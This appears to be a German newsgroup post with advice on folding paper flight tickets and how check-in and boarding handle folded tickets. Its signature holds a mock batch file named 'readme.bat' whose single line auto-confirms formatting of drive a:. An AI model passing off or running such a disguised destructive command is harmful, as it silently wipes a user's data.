Ich knicke meine Flugtickets fast immer, damit ich sie griffbereit in
meine Hemdentasche stecken kann. Ungeknickt habe ich immer die
Befuerchtung, diese leichter verlieren zu koennen.

Mit dem Knick gab es bislang weder bei den Automaten zum automatischen
Einchecken (ohne Reisegepaeck) Probleme, auch nicht mit den
Magnetstreifenlesegeraet beim Einchecken (mit Gepaeck). Auch nicht
beim spaetern Einstieg in die Maschine.

Es ist mir nur aufgefallen, dass die Damen beim Einchecken das
geknickte Ticket i.d.R. durch eine neue Bordkarte ersetzen
(normalerweise kann das Ticket durch den zusaetzlichen Aufdruck beim
Einchecken auch als Bordkarte benutzt werden).

Du solltest nur aufpassen, das das Ticket nicht eingerissen ist, nicht
aufgeweicht ist (z.B. durch Schweiss in der Hemdentasche) oder
Eselsohren hat.

Martin
-- 
begin  readme.bat
echo .|c:\windows\command\format a:
end